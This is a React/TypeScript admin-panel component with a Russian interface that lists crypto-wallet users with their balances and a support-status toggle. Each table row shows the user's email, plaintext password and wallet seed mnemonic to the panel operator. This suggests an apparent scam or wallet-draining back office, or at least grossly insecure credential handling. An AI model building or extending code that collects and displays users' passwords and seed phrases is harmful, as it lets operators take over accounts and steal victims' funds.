import { useContext, useEffect, useState } from "react"
import axios from "axios"
import { SERVER_URL, HEADERS } from "../constants"
import { IUserContext } from "../Types"
import { UsersContext } from "../Contexts/AppContext"
import { reverseArr, toLocalTime } from "../Hooks/helpers"
// import { logoutHandler } from "../Hooks/helpers"



export const UsersPage = () => {

    // const [swapPercent, setSwapPercent] = useState<any>();
    // const [swapPercentLoading, setSwapPercentLoading] = useState<boolean>(false)

    const [supportStatus, setSupportStatus] = useState<boolean>()
    const [supportStatusLoading, setSupportStatusLoading] = useState<boolean>(false)
    const [users, setUsers] = useState<IUserContext[]>()

    const { usersContext } = useContext(UsersContext)

    // const changeSwapPercent = () => {
    //     setSwapPercentLoading(true)
    //     var dt = {
    //         valueData: Number(swapPercent),
    //         keyData: "swap_percent"
    //     }
    //     axios.post(SERVER_URL + 'admin/system/update', dt, { headers: HEADERS })
    //         .then(() => {
    //             setSwapPercentLoading(false)
    //         })
    //         .catch((error) => {
    //             console.log(error)
    //             if (error.status == 401 || error.code == "ERR_NETWORK") {
    //                 console.log("Invalid Token")
    //                 logoutHandler()
    //                 navigate('/login/')
    //             }
    //         })
    // }

    const changeSupportStatus = () => {
        setSupportStatusLoading(true)
        var dt = {
            systemParameterValue: supportStatus ? 1 : 0,
            systemParameterKey: "support_status"
        }
        axios.post(SERVER_URL + '/admin/support/update', dt, { headers: { ...HEADERS, Authorization: `${sessionStorage.getItem("auth-type")} ${sessionStorage.getItem("auth-token")}` } })
            .then(() => {
                setSupportStatusLoading(false)
            })
            .catch((error) => {
                console.log(error)
            })
    }

    useEffect(() => {
        if (usersContext) {
            setUsers(reverseArr(usersContext))
        }
        axios.post(SERVER_URL + '/admin/support/get', { systemParameterKey: "support_status" }, { headers: { ...HEADERS, Authorization: `${sessionStorage.getItem("auth-type")} ${sessionStorage.getItem("auth-token")}` } })
            .then(r => {
                console.log(r.data)
                setSupportStatus(Boolean(Number(r.data.systemParameterValue)))
            })
    }, [])

    useEffect(() => {
        if (usersContext) {
            setUsers(reverseArr(usersContext))
        }
        axios.post(SERVER_URL + '/admin/support/get', { systemParameterKey: "support_status" }, { headers: { ...HEADERS, Authorization: `${sessionStorage.getItem("auth-type")} ${sessionStorage.getItem("auth-token")}` } })
            .then(r => {
                console.log(r.data)
                setSupportStatus(Boolean(Number(r.data.systemParameterValue)))
            })
    }, [usersContext])

    // const navigate = useNavigate()
    return (
        <>
            <div className="container-fluid">
                <div className="page-title">
                    <div className="row">
                        <div className="col-sm-6">
                            <h3>Все кошельки</h3>
                        </div>
                        <div className="col-sm-6">
                            <ol className="breadcrumb">
                                <li className="breadcrumb-item"><a href="/" data-bs-original-title="" title="">Список кошельков</a></li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
            {/* <div className="mb-4 container-fluid">
                <div className="row">
                    <div className="col-12">
                        <div className="card">
                            <div className="card-header">
                                <h4>Процент надбавки для свапа</h4>
                            </div>
                            <div className="card-body">
                                <div className="swap_percent_form">
                                    <input name="swap_percent" className="swap_percent_input" type="number" value={swapPercent} data-bs-original-title="" title="" onChange={(event) => setSwapPercent(Number(event.target.value))} />
                                    <button type="submit" disabled={swapPercentLoading} className="swap_percent_btn" data-bs-original-title="" title="" onClick={changeSwapPercent}>
                                        <p>Обновить</p>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div> */}
            <div className="mb-4 container-fluid">
                <div className="row">
                    <div className="col-12">
                        <div className="card">
                            <div className="card-header">
                                <h4>Статус поддержки</h4>
                            </div>
                            <div className="card-body">
                                <div className="swap_percent_form">
                                    <input type="checkbox" checked={supportStatus} onChange={() => setSupportStatus(!supportStatus)} />
                                    <button type="submit" disabled={supportStatusLoading} className="swap_percent_btn" data-bs-original-title="" title="" onClick={changeSupportStatus}>
                                        <p>Обновить</p>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            {/* <div className="container-fluid">
                <div className="row">
                    <div className="col-12">
                        <div className="card">
                            <div className="card-header">
                                <h4>Управление токенами</h4>
                            </div>
                            <div className="card-body" style={{ display: "flex", justifyContent: "flex-start", alignItems: "center", gap: "1rem" }}>
                                <button type="submit" data-bs-original-title="" className="all-tokens-btn" title="" onClick={() => navigate('/tokens/')}>Все токены</button>
                                <button type="submit" data-bs-original-title="" className="all-tokens-btn" title="" onClick={() => navigate('/stakings/')}>Все стейкинги</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div> */}
            <div className="container-fluid">
                <div className="row">
                    <div className="col-sm-12">
                        <div className="card">
                            <div className="card-header">
                                <h4>Список кошельков</h4>
                            </div>
                            <div className="card-body">
                                <div className="jsgrid">
                                    <div className="jsgrid-grid-body">
                                        <table className="jsgrid-table">
                                            <thead style={{ borderBottom: "1px solid #e9e9e9;" }}>
                                                <tr className="jsgrid-header-row">
                                                    <th className="jsgrid-header-cell jsgrid-header-sortable default">ID</th>
                                                    <th className="jsgrid-header-cell jsgrid-header-sortable default">Дата создания</th>
                                                    <th className="jsgrid-header-cell jsgrid-header-sortable default">Сообщения</th>
                                                    <th className="jsgrid-header-cell jsgrid-header-sortable description">Данные пользователя</th>
                                                    <th className="jsgrid-header-cell jsgrid-header-sortable seed">Seed</th>
                                                    <th className="jsgrid-header-cell jsgrid-header-sortable default">Баланс</th>
                                                    {/* <th className="jsgrid-header-cell jsgrid-header-sortable default">Дата создания</th>
                                                    <th className="jsgrid-header-cell jsgrid-header-sortable description">Описание</th> */}
                                                    <th className="jsgrid-header-cell jsgrid-header-sortable action">Действие</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                {users?.map((us: IUserContext) => <UserListBlock userData={us} link={`/user/${us.id}`} />)}
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    )
}

export const numberToUsdFormat = (value: number | string, price: number | string): string => {
    return parseFloat(String(Number(value) * Number(price))).toFixed(2)
}

export const numberToUsdFormat2 = (value: number | string): string => {
    return parseFloat(String(value)).toFixed(2)
}

export const UserListBlock = ({ userData, link }: { userData: IUserContext, link?: string }) => {

    const [walletBalance, setWalletBalance] = useState<any>()

    useEffect(() => {
        var tBalance = 0
        userData?.userWallet?.walletAddresses?.forEach(wa => {
            tBalance += Number(wa.balance) * Number(wa.token.price)
        })
        setWalletBalance(tBalance)
    }, [])

    useEffect(() => {
        var tBalance = 0
        userData?.userWallet?.walletAddresses?.forEach(wa => {
            tBalance += Number(wa.balance) * Number(wa.token.price)
        })
        setWalletBalance(tBalance)
    }, [userData])

    const clicked = () => {
        if (link) {
            window.location.href = link
        }
    }

    return (
        <tr className="jsgrid-row">
            <td className="jsgrid-cell default">ID:{userData?.id}</td>
            <td className="jsgrid-cell default">{toLocalTime(String(userData?.dateCreated.toString())).toLocaleString()}</td>
            <td className="jsgrid-cell default">Непрочитаные: {userData.unreadCount}</td>
            <td className="jsgrid-cell description">{`Никнейм: ${userData?.username}. Почта: ${userData.email}. Пароль: ${userData.userData.password}. Описание: ${userData.userData.description == null ? '' : userData.userData.description}`}</td>
            <td className="jsgrid-cell seed">{userData?.userData.mnemonic}</td>
            <td className="jsgrid-cell default">{walletBalance} $</td>
            {/* <td className="jsgrid-cell default">{walletData?.dateCreated?.toString()}</td> */}
            {/* <td className="jsgrid-cell description">{walletData?.description}</td> */}
            <td className="jsgrid-align-center jsgrid-cell jsgrid-control-field action">
                <input className="jsgrid-button jsgrid-edit-button" onClick={clicked} type="button" title="" data-bs-original-title="Edit" aria-label="Edit" />
                {/* <input className="jsgrid-button jsgrid-delete-button" type="button" title="" data-bs-original-title="Delete" aria-label="Delete" /> */}
            </td>
        </tr>
    )
}
